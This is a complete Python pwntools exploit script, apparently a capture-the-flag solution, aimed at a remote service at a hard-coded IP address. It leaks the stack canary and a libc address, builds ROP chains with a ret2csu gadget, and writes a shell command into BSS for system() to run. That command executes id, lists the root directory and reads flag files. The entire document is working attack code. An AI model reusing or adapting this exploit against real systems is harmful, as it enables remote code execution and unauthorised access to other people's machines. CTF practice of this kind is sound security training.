#!/usr/bin/env python3
"""Two-stage exploit with BSS command write."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./attachment-56', checksec=False)
HOST = '39.96.193.120'
PORT = 10001

OFFSET = 24
MARKER = b'A' * 25
POP_RDI = 0x401763
RET = 0x40101a
CSU_POP = 0x40175a
CSU_CALL = 0x401740
BSS = 0x404e00

PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
READ_GOT = elf.got['read']
MAIN = elf.sym['main']


def csu_call(func_ptr, arg1, arg2, arg3, ret_addr):
    return flat(
        CSU_POP, 0, 1, arg1, arg2, arg3, func_ptr,
        CSU_CALL,
        0, 0, 0, 0, 0, 0, 0,
        ret_addr,
    )


r = remote(HOST, PORT)

# ==== Pass lock_one ====
r.sendlineafter(b"wizard's note:", b'100')
r.sendlineafter(b'rune sheet!', b'magic')

# ==== Stage 1: Leak canary + puts@libc ====
r.recvuntil(b'What do you sacrifice?\n')
r.send(MARKER)
leak = r.recvuntil(b'curious gift indeed.\n')
pos = leak.rfind(MARKER)
canary = u64(b'\x00' + leak[pos + len(MARKER):pos + len(MARKER) + 7])
log.success(f'canary = {hex(canary)}')

rop1 = flat(POP_RDI, PUTS_GOT, PUTS_PLT, MAIN)
payload1 = flat({0: b'B' * OFFSET, 24: p64(canary), 32: b'C' * 8, 40: rop1})
r.send(payload1)

r.recvuntil(b'warmth.\n')
puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
log.success(f'puts@libc = {hex(puts_addr)}')

puts_off = 0x875a0
libc_base = puts_addr - puts_off
system = libc_base + 0x55410
binsh = libc_base + 0x1b75aa
log.success(f'libc_base = {hex(libc_base)}')
log.success(f'system = {hex(system)}')
log.success(f'binsh = {hex(binsh)}')

# ==== Stage 2: read command into BSS, then system(BSS) ====
cmd = b'echo HELLO;id;ls -la /;cat /flag* 2>&1;cat flag* 2>&1\x00'
cmdsize = ((len(cmd) + 7) // 8) * 8

cmd_chain = csu_call(READ_GOT, 0, BSS, cmdsize, POP_RDI)
final_chain = flat(cmd_chain, BSS, system)
rop2 = flat(RET, final_chain)
payload2 = flat({0: b'D' * OFFSET, 24: p64(canary), 32: b'E' * 8, 40: rop2})

r.send(b'\x00')
r.recvuntil(b'curious gift indeed.\n')
r.send(payload2)

sleep(0.5)
r.send(cmd.ljust(cmdsize, b'\x00'))

sleep(1)
try:
    data = r.recvall(timeout=4)
    log.success(f'Output ({len(data)} bytes):')
    print(data.decode(errors='replace'))
except:
    log.info('No output')

r.close()
